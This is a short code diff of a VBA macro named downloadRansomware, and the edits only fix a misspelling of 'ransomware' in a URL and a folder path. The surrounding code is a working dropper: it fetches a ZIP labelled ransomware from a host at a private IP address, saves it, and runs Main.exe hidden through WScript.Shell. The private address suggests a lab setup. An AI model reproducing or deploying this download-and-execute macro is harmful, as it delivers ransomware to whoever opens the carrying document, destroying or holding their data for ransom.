@@ -7,7 +7,7 @@ Sub downloadRansomware()
     'Download the ransomware in a ZIP format
     Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
     Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
-    xHttp.Open "GET", "http://192.168.85.128/ransonware.zip", False
+    xHttp.Open "GET", "http://192.168.85.128/ransomware.zip", False
     xHttp.Send
     
         With bStrm
@@ -31,7 +31,7 @@ Sub downloadRansomware()
     
     'Execute the ransomware
     Dim command As String
-    command = "cmd /K cd %TEMP%\ransonware\ & .\Main.exe"
+    command = "cmd /K cd %TEMP%\ransomware\ & .\Main.exe"
     Set execShell = CreateObject("WScript.Shell")
     execShell.Run command, 0, False
     
